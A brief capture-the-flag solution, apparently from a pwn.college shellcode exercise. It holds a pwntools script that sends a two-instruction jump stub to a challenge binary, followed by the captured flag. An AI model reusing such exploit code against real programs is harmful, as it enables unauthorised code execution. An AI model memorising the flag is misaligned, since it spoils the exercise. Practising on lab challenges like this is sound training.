## scriptttt
```
from pwn import *

context.clear(arch='amd64')

code = asm("""
    mov rax, 0x403000
    jmp rax
""")

p = process('/challenge/run')
p.send(code)
p.shutdown('send')
print(p.recvall(timeout=2))
```
## phlag
```
pwn.college{oC9WDHBWd2dU0BmZHQ9Gf6GSN-2.QX1EDOzwSMwEzNzEzW}
```
